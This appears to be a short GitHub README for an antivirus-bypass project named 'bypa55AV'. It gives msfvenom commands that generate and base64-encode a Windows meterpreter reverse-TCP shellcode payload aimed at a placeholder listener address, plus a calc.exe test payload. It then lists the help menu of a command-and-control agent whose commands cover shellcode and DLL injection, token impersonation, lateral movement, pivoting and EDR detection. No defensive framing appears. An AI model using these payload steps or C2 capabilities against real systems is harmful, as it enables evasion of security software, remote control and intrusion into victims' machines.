# bypa55AV
// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=5555 -f raw > rev.raw     
// base64 -w 0 -i rev.raw > rev.bs64     
// cat rev.bs64     
 
msfvenom -p windows/x64/exec CMD=calc.exe -f raw |base64               


<div align="center">  
  <img  src="https://github-readme-streak-stats.herokuapp.com?user=xiaotsai&theme=onedark&date_format=M%20j%5B%2C%20Y%5D" />
</div>
------------------------
```
help               Command      Shows help message of specified command
  sleep              Command      sets the delay to sleep
  checkin            Command      request a checkin request
  job                Module       job manager
  task               Module       task manager
  proc               Module       process enumeration and management
  transfer           Command      download transfer module
  dir                Command      list specified directory
  download           Command      downloads a specified file
  upload             Command      uploads a specified file
  cd                 Command      change to specified directory
  cp                 Command      copy file from one location to another
  remove             Command      remove file or directory
  mkdir              Command      create new directory
  pwd                Command      get current directory
  cat                Command      display content of the specified file
  screenshot         Command      takes a screenshot
  shell              Command      executes cmd.exe commands and gets the output
  powershell         Command      executes powershell.exe commands and gets the output
  inline-execute     Command      executes an object file
  shellcode          Module       shellcode injection techniques
  dll                Module       dll spawn and injection modules
  exit               Command      cleanup and exit
  token              Module       token manipulation and impersonation
  dotnet             Module       execute and manage dotnet assemblies
  net                Module       network and host enumeration module
  config             Module       configure the behaviour of the demon session
  pivot              Module       pivoting module
  rportfwd           Module       reverse port forwarding
  socks              Module       socks4a proxy
  jump-exec          Module       lateral movement module
  powerpick          Command      executes unmanaged powershell commands
  arp                Command      Lists out ARP table
  driversigs         Command      checks drivers for known edr vendor names
  ipconfig           Command      Lists out adapters, system hostname and configured dns serve
  listdns            Command      lists dns cache entries
  locale             Command      Prints locale information
  netstat            Command      List listening and connected ipv4 udp and tcp connections
  resources          Command      list available memory and space on the primary disk drive
  routeprint         Command      prints ipv4 routes on the machine
  uptime             Command      lists system boot time
  whoami             Command      get the info from whoami /all without starting cmd.exe
  windowlist         Command      list windows visible on the users desktop
  dcenum             Command      enumerate domain information using Active Directory Domain Services
```
